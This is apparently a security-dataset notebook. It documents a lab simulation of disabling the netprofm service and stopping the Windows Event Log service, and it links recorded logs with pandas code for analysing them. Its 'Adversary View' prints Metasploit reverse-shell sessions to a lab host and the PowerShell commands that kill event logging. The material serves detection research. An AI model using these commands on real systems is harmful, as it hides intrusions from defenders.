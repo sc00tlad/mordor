{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "58967bd8",
   "metadata": {},
   "source": [
    "# Stopping Event Log Service after Stopping Depending Services"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ed7e2745",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c7b97725",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/07/08 |\n",
    "| Modification Date | 2022/08/08 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | powershell,eventlog,netprofm |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c5fa47b",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "The simulation of this technique cosniders 2 steps Disabling the netprofm service (Before reboot) and stopping the Event Log service (After reboot). Therefore, 2 datasets were generated, before-reboot and after-reboot data. We have used PowerShell to execute this simulation Execution using PowerShell (Spawned from cmd.exe) and execution using the PowerShell module from Metasploit. This dataset was generated using a Windows 10 Pro Evaluation edition (Version:1903,OS Build:18362.30)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f45b7b95",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "72fe7776",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_psh_stop_netprofm_eventlog_before_reboot.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_psh_stop_netprofm_eventlog_before_reboot.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_psh_stop_netprofm_eventlog_after_reboot.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_psh_stop_netprofm_eventlog_after_reboot.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_metasploit_stop_netprofm_eventlog_before_reboot.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_metasploit_stop_netprofm_eventlog_before_reboot.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_metasploit_stop_netprofm_eventlog_after_reboot.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_metasploit_stop_netprofm_eventlog_after_reboot.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17947488",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "beeaee09",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "598f9fe0",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | PowerShell | [PowerShell](https://docs.microsoft.com/en-us/powershell/) |\n",
    "| Manual | Metasploit | [powershell](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/powershell.rb) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5ebf3cbb",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "**** Using PowerShell (cmd.exe) - Before reboot:\n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: e2mshuiq) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 1 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-08 15:30:15 -0400 \n",
    "meterpreter > shell \n",
    "Process 9804 created. \n",
    "Channel 1 created. \n",
    "Microsoft Windows [Version 10.0.18362.30] \n",
    "(c) 2019 Microsoft Corporation. All rights reserved. \n",
    "C:\\Users\\IT01-Pedro\\Downloads>powershell \n",
    "powershell \n",
    "Windows PowerShell \n",
    "Copyright (C) Microsoft Corporation. All rights reserved. \n",
    "Try the new cross-platform PowerShell https://aka.ms/pscore6 \n",
    "\n",
    "PS C:\\Users\\IT01-Pedro\\Downloads> Set-Service -Name netprofm -StartupType Disabled \n",
    "Set-Service -Name netprofm -StartupType Disabled \n",
    "PS C:\\Users\\IT01-Pedro\\Downloads> \n",
    "\n",
    "**** Using PowerShell (cmd.exe) - After reboot: \n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: v8fufyz7) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 4 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-08 15:48:54 -0400 \n",
    "meterpreter > shell \n",
    "Process 1536 created. \n",
    "Channel 1 created. \n",
    "Microsoft Windows [Version 10.0.18362.30] \n",
    "(c) 2019 Microsoft Corporation. All rights reserved. \n",
    "C:\\Users\\IT01-Pedro\\Downloads>powershell \n",
    "powershell \n",
    "Windows PowerShell \n",
    "Copyright (C) Microsoft Corporation. All rights reserved. \n",
    "Try the new cross-platform PowerShell https://aka.ms/pscore6 \n",
    "\n",
    "PS C:\\Users\\IT01-Pedro\\Downloads> Stop-Service -Name EventLog -Force \n",
    "Stop-Service -Name EventLog -Force \n",
    "PS C:\\Users\\IT01-Pedro\\Downloads> Get-Service -Name eventlog \n",
    "Get-Service -Name eventlog \n",
    "\n",
    "Status   Name               DisplayName                            \n",
    "------   ----               -----------                            \n",
    "Stopped  eventlog           Windows Event Log\n",
    "\n",
    "PS C:\\Users\\IT01-Pedro\\Downloads> \n",
    "\n",
    "**** Using PowerShell (Metasploit) - Before reboot: \n",
    "msf6 exploit(multi/handler) > run \n",
    "\n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: l4nzbqn1) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 5 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-08 16:39:26 -0400 \n",
    "meterpreter > load powershell \n",
    "Loading extension powershell...Success. \n",
    "meterpreter > powershell_execute \" Set-Service -Name netprofm -StartupType Disabled \" \n",
    "[+] Command execution completed: \n",
    "meterpreter >\n",
    "\n",
    "**** Using PowerShell (Metasploit) - After reboot: \n",
    "msf6 exploit(multi/handler) > run \n",
    "\n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: khsnizoi) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 6 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-08 16:55:45 -0400 \n",
    "meterpreter > load powershell \n",
    "Loading extension powershell...Success. \n",
    "meterpreter > powershell_execute \" Stop-Service -Name EventLog -Force \" \n",
    "[+] Command execution completed: \n",
    "meterpreter > powershell_execute \"get-service -Name EventLog\" \n",
    "[+] Command execution completed: \n",
    "\n",
    "Status   Name               DisplayName \n",
    "------   ----               ----------- \n",
    "Stopped  EventLog           Windows Event Log \n",
    "\n",
    "meterpreter > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d597b43",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aaf034f4",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b853451",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_psh_stop_netprofm_eventlog_before_reboot.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e13d3d3c",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "76ccac4a",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e0413994",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5239fee",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf9565b3",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2) \n",
    "* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-service?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-service?view=powershell-7.2) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
